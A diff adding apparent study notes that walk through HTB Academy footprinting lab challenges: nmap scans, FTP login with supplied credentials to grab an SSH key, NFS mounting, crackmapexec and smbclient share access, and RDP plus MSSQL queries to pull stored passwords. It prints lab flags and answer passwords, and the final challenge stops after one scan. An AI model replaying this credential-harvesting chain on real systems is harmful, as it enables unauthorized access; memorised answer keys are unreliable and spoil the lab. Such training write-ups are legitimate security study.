@@ -2100,3 +2100,156 @@ Question 2 - Connect to the MSSQL instance running on the target using the accou
 3) Answer: Employees 
 
 
+### Skill Challenges : all that yapping to see if i can do any of these : ] 
+
+
+Easy: Footprinting Lab - Easy
+We were commissioned by the company Inlanefreight Ltd to test three different servers in their internal network. 
+The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.
+
+The first server is an internal DNS server that needs to be investigated. 
+In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. 
+Our goal is to gather as much information as possible about the server and find ways to use that information against the company. 
+However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.
+
+Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum.
+
+The administrators have stored a flag.txt file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.
+
+## k so we have creds - ceil:qwer1234 and the other hint was they were talking bout SSH keys in a forum or something. so were gonna start out with ol faithful - sudo nmap -sCV -A 10.129.42.195
+
+1) sudo nmap -sCV -A 10.129.42.195
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:03 CST
+Nmap scan report for 10.129.42.195
+Host is up (0.0084s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.42.195]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
+|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
+|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
+53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+2121/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (Ceil's FTP) [10.129.42.195]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+
+2) from this output we see (Ceils FTP) on port 2121 so lets use the free creds given to us to log in 
+3) enter ceil then qwer1234
+4) ls -lah 
+5) we see a .ssh directory we can read and since that was in the hint as well lets peek n poke
+6) we see 3 files inside .ssh -> authroized_keys & id_rsa & id_rsa.pub -> i used get to downlaod all three cause i always forget the one we actually need. 
+7) back on host machine were going to try to ssh our way in 
+7) change permissions on id_rsa -> chmod 600 id_rsa 
+8) ssh ceil@10.129.42.195 -i id_rsa
+9) ls -lah -> same thing as in ftp server 
+10) cd ..
+11) ls -lah 
+12) cd flag 
+13) cat flag.txt -> HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
+
+
+### Skill challenge Medium - 
+
+This second server is a server that everyone on the internal network has access to. 
+In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.
+
+Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named HTB has been created. 
+Accordingly, we need to obtain the credentials of this user as proof.
+
+Question - Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer. -> start with old faithful and continue from there 
+1) sudo nmap -sCV -A 10.129.202.41
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:22 CST
+Nmap scan report for 10.129.202.41
+Host is up (0.0086s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+111/tcp  open  rpcbind?
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+2049/tcp open  nlockmgr      1-4 (RPC #100021)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WINMEDIUM
+|   NetBIOS_Domain_Name: WINMEDIUM
+|   NetBIOS_Computer_Name: WINMEDIUM
+|   DNS_Domain_Name: WINMEDIUM
+|   DNS_Computer_Name: WINMEDIUM
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-01-30T20:23:06+00:00
+| ssl-cert: Subject: commonName=WINMEDIUM
+| Not valid before: 2025-01-29T19:20:44
+|_Not valid after:  2025-07-31T19:20:44
+|_ssl-date: 2025-01-30T20:23:14+00:00; +2s from scanner time.
+
+2) okay going back to notes lets try -> rpcinfo -p 10.129.202.41
+3) showmount -a 10.129.202.41
+4) showmount -e 10.129.202.41 -> tells us TechSupport 
+5) mkdir target-NFS
+6) sudo mount -t nfs 10.129.202.41:/TechSupport ./target-NFS/ -o nolock
+7) sudo su 
+8) cd target-NFS 
+9) ls -lah -> youll see a LOT of tickets but only one has actual size in the file -> ticket4238791283782.txt
+10) cat ticket4238791283782.txt
+11) you get login info ->     user="alex"
+   			      password="smbclient -U alex \\\\10.129.202.41\\devshare"
+ 			      from="alex.g@web.dev.inlanefreight.htb"
+
+12) crackmapexec smb 10.129.202.41 --shares -u 'alex' -p 'lol123!mD' -d 'WINMEDIUM'
+13) we see all the shares but one that sticks out is - devshare which we have read,write permissions to
+14) smbclient -U alex \\\\10.129.202.41\\devshare
+14.a) enter password
+14.b) dir 
+14.c) get important.txt 
+15) back on host machine lets peek n poke important.txt -> sa:87N1ns@slls83 service account creds 
+16) xfreerdp /v:10.129.202.41 /u:Administrator /p:'87N1ns@slls83' /cert:ignore /d:WINMEDIUM 
+17) find microsoft sql server management studio 
+18) hit connect 
+19) Accounts -> Tables -> dbo.devsacc -> Columns -> build query 
+20) SELECT TOP (1000) [id]
+        ,[name]
+		,[password]
+FROM [accounts].[dbo].[devsacc] -> i had to look this up im not going to lie i didnt know how to build this correctly but its ok i got us here lol 
+21) scroll down til we find the HTB account (157) and -> lnch7ehrdn43i7AoqVPK4zWR
+
+#### Challenge HARD 
+
+The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. 
+Accordingly, a user named HTB was also created here, whose credentials we need to access.
+
+Question: Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
+
+1 ) sudo nmap -sCV -A 10.129.19.122
+
+
